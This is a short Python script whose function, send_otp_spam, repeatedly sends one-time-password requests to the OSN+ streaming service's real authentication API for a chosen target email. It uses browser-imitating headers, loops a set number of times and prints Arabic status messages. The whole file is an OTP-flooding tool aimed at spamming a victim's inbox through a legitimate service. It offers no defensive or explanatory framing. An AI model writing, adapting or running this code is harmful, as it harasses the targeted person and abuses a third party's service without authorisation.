import requests
import json
import time

def send_otp_spam(email: str, attempts: int = 1):
    """
    Sends multiple OTP requests to the specified email address.

    Args:
        email: The target email address.
        attempts: The number of OTP requests to send.
    """
    url = "https://api.osnplus.com/osn/auth/v1/send-otp"

    headers = {
        "Host": "api.osnplus.com",
        "language": "ar",
        "sec-ch-ua-platform": "Android",
        "client_version": "1.6.5",
        "sec-ch-ua": '''"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"''',
        "sec-ch-ua-mobile": "?1",
        "client_platform": "web-osn",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "build_type": "prod",
        "content-type": "application/json",
        "accept": "/",
        "origin": "https://osnplus.com",
        "referer": "https://osnplus.com/"
    }

    for i in range(attempts):
        payload = {
            "toEmail": {"email": email},
            "attemptsDA": 1
        }

        try:
            res = requests.post(url, headers=headers, data=json.dumps(payload))
            if res.status_code == 200:
                print(f"تم إرسال OTP بنجاح (المحاولة {i+1}/{attempts})")
            else:
                print(f"فشل إرسال OTP (المحاولة {i+1}/{attempts}): {res.status_code} - {res.text}")
        except requests.exceptions.RequestException as e:
            print(f"حدث خطأ أثناء الاتصال (المحاولة {i+1}/{attempts}): {e}")
        time.sleep(1)

